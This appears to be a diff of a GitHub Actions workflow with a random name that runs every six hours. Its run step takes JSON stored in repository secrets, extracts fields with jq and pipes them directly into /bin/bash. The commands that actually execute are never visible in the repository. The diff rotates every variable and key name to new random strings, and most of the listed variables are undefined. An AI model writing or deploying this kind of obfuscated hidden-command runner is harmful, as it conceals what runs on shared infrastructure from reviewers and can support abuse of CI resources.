@@ -1,8 +1,9 @@
 name: duanqirui2603
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '14 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: duanqirui2603
         env:
-          xauw604: ${{ secrets.xauw604 }}
+          p28: ${{ secrets.p28 }}
         run: |
-          echo $xauw604 | jq -r .a824 | /bin/bash
-          echo $yec728 | jq -r .ti932 | /bin/bash
-          echo $rdm15674 | jq -r .jw645 | /bin/bash
-          echo $bgox6733 | jq -r .gceok30 | /bin/bash
-          echo $d15603 | jq -r .rsho66 | /bin/bash
-          echo $f10 | jq -r .pw093 | /bin/bash
-          echo $n42175 | jq -r .pbpt6 | /bin/bash
-          echo $kbbo2 | jq -r .fkwq66 | /bin/bash
-          echo $gjid1 | jq -r .z400 | /bin/bash
-          echo $leeep5095 | jq -r .qzrz749 | /bin/bash
-          echo $tmx20 | jq -r .v31399 | /bin/bash
-          echo $kywl07 | jq -r .pbwx2 | /bin/bash
-          echo $lmjv4203 | jq -r .tr3860 | /bin/bash
-          echo $uip2 | jq -r .jb93 | /bin/bash
-          echo $cer1884 | jq -r .cng2141 | /bin/bash
+          echo $p28 | jq -r .ioytl53372 | /bin/bash
+          echo $np83 | jq -r .czk549 | /bin/bash
+          echo $duc58459 | jq -r .ifq24 | /bin/bash
+          echo $ss14 | jq -r .o99 | /bin/bash
+          echo $jlt65 | jq -r .mziyz70 | /bin/bash
+          echo $ci64 | jq -r .owxk6588 | /bin/bash
+          echo $bzat7313 | jq -r .m9 | /bin/bash
+          echo $fle05 | jq -r .eivy5 | /bin/bash
+          echo $banj8 | jq -r .qmlee12 | /bin/bash
+          echo $adjn635 | jq -r .ysz47703 | /bin/bash
+          echo $iyl496 | jq -r .jz655 | /bin/bash
+          echo $ht9 | jq -r .iep9 | /bin/bash
 
